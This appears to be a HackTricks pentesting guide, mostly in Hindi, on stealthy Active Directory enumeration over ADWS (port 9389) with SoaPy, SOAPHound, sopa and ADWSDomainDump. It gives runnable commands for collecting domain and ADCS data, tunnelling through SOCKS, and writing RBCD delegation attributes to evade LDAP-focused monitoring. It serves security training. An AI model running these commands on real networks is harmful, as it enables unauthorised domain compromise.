# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS क्या है?

Active Directory Web Services (ADWS) हर Domain Controller पर **Windows Server 2008 R2 से डिफ़ॉल्ट रूप से सक्षम है** और TCP **9389** पर सुनता है। नाम के बावजूद, **कोई HTTP शामिल नहीं है**। इसके बजाय, सेवा LDAP-style डेटा को मालिकाना .NET framing protocols की एक स्टैक के माध्यम से एक्सपोज़ करती है:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

क्योंकि ट्रैफ़िक इन बाइनरी SOAP फ्रेम्स के अंदर कैप्सुलेट होता है और एक असामान्य पोर्ट पर यात्रा करता है, **enumeration through ADWS क्लासिक LDAP/389 & 636 ट्रैफ़िक की तुलना में निरीक्षित, फ़िल्टर्ड या सिग्नेचर होने की संभावना बहुत कम है**। ऑपरेटर्स के लिए इसका मतलब:

* Stealthier recon – Blue teams अक्सर LDAP queries पर ध्यान देते हैं।
* non-Windows hosts (Linux, macOS) से संग्रह करने की स्वतंत्रता, बस 9389/TCP को SOCKS proxy के जरिए टनल करें।
* वही डेटा जो आप LDAP से प्राप्त करते (users, groups, ACLs, schema, आदि) और लिखने की क्षमता (उदा. `msDs-AllowedToActOnBehalfOfOtherIdentity` for **RBCD**)।

ADWS इंटरैक्शन्स WS-Enumeration पर इम्प्लिमेंटेड हैं: हर query `Enumerate` संदेश से शुरू होती है जो LDAP filter/attributes को परिभाषित करता है और एक `EnumerationContext` GUID लौटाता है, उसके बाद एक या अधिक `Pull` संदेश आते हैं जो server-defined result window तक स्ट्रीम करते हैं। Contexts लगभग 30 मिनट के बाद expire होते हैं, इसलिए टूलिंग को या तो results को पेज करना होगा या स्टेट खोने से बचने के लिए filters को विभाजित करना होगा (CN के अनुसार prefix queries)। जब security descriptors माँगे जाएँ, तो SACLs को छोड़ने के लिए `LDAP_SERVER_SD_FLAGS_OID` control निर्दिष्ट करें, अन्यथा ADWS अपने SOAP response से `nTSecurityDescriptor` attribute को ही ड्रॉप कर देता है।

> NOTE: ADWS कई RSAT GUI/PowerShell tools द्वारा भी उपयोग किया जाता है, इसलिए ट्रैफ़िक legit admin activity के साथ मिश्रित हो सकता है।

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ADWS protocol stack का pure Python में **पूर्ण पुनः-इम्प्लीमेंटेशन** है। यह NBFX/NBFSE/NNS/NMF फ्रेम्स को बाइट-बाई-बाइट क्राफ्ट करता है, जिससे Unix-like सिस्टम्स से .NET runtime को छुए बिना संग्रह संभव होता है।

### Key Features

* SOCKS के माध्यम से proxying का समर्थन (C2 implants से उपयोगी)।
* LDAP `-q '(objectClass=user)'` के समान फाइन-ग्रेन्युलर search filters।
* वैकल्पिक **write** ऑपरेशन्स (`--set` / `--delete`)।
* BOFHound output mode ताकि सीधे BloodHound में ingest किया जा सके।
* मानव पठनीयता के लिए timestamps / `userAccountControl` को सुंदर करने के लिए `--parse` flag।

### Targeted collection flags & write operations

SoaPy क्यूरेटेड switches के साथ आता है जो ADWS पर सबसे सामान्य LDAP hunting tasks को दोहराते हैं: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, साथ ही कस्टम pulls के लिए raw `--query` / `--filter` knobs। इन्हें ऐसे write primitives के साथ जोड़ा जा सकता है जैसे `--rbcd <source>` (सेट करता है `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (targeted Kerberoasting के लिए SPN staging) और `--asrep` (`userAccountControl` में `DONT_REQ_PREAUTH` को फ्लिप करना)।

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
इसी host/credentials का उपयोग करके तुरंत findings को weaponise करें: RBCD-capable objects को `--rbcds` से dump करें, फिर Resource-Based Constrained Delegation chain को stage करने के लिए `--rbcd 'WEBSRV01$' --account 'FILE01$'` लागू करें (पूर्ण abuse path के लिए देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### इंस्टॉलेशन (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump ADWS के माध्यम से (Linux/Windows)

* `ldapdomaindump` का fork जो LDAP queries को TCP/9389 पर ADWS calls में बदलता है ताकि LDAP-signature hits कम हों।
* 9389 पर प्रारंभिक पहुँच जांच करता है जब तक `--force` पास न किया गया हो (यदि port scans noisy/filtered हों तो probe को स्किप करता है)।
* Microsoft Defender for Endpoint और CrowdStrike Falcon के खिलाफ परीक्षण किया गया; README में सफल bypass दिखाया गया है।

### इंस्टॉलेशन
```bash
pipx install .
```
### उपयोग
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
सामान्य आउटपुट 9389 की पहुँच जाँच, ADWS bind, और dump शुरू/समाप्ति को लॉग करता है:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **ऑब्जेक्ट खोज और पुनर्प्राप्ति** - `query` / `get`
* **ऑब्जेक्ट लाइफसाइकिल** - `create [user|computer|group|ou|container|custom]` and `delete`
* **ऐट्रिब्यूट संपादन** - `attr [add|replace|delete]`
* **खाता प्रबंधन** - `set-password` / `change-password`
* और अन्य जैसे `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, आदि।

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is a .NET collector that keeps all LDAP interactions inside ADWS and emits BloodHound v4-compatible JSON. It builds a complete cache of `objectSid`, `objectGUID`, `distinguishedName` and `objectClass` once (`--buildcache`), then re-uses it for high-volume `--bhdump`, `--certdump` (ADCS), or `--dnsdump` (AD-integrated DNS) passes so only ~35 critical attributes ever leave the DC. AutoSplit (`--autosplit --threshold <N>`) automatically shards queries by CN prefix to stay under the 30-minute EnumerationContext timeout in large forests.

Typical workflow on a domain-joined operator VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON सीधे SharpHound/BloodHound workflows में भेजे जा सकते हैं—आगे के ग्राफ़िंग विचारों के लिए [BloodHound methodology](bloodhound.md) देखें।

AutoSplit, SOAPHound को multi-million object forests पर resilient बनाता है जबकि query count को ADExplorer-style snapshots की तुलना में कम रखता है।

## Stealth AD संग्रह कार्यप्रवाह

निम्न कार्यप्रवाह दिखाता है कि कैसे ADWS के ऊपर **domain & ADCS objects** को enumerate किया जाए, उन्हें BloodHound JSON में convert किया जाए और certificate-based attack paths के लिए hunt किया जाए – यह सब Linux से:

1. **Tunnel 9389/TCP** को target नेटवर्क से आपके बॉक्स तक बनाएं (उदा. Chisel, Meterpreter, SSH dynamic port-forward, आदि के माध्यम से)। `export HTTPS_PROXY=socks5://127.0.0.1:1080` export करें या SoaPy’s `--proxyHost/--proxyPort` का उपयोग करें।

2. **रूट डोमेन ऑब्जेक्ट को इकट्ठा करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC से ADCS-related objects एकत्र करें:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound में रूपांतरित करें:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP को BloodHound GUI में अपलोड करें** और `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` जैसी cypher queries चलाएँ ताकि certificate escalation paths (ESC1, ESC8, आदि) प्रकट हों।

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) लिखना
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
इसे `s4u2proxy`/`Rubeus /getticket` के साथ मिलाकर एक पूर्ण **Resource-Based Constrained Delegation** श्रृंखला बनाएँ (देखें [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## उपकरण सारांश

| उद्देश्य | उपकरण | टिप्पणियाँ |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## संदर्भ

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
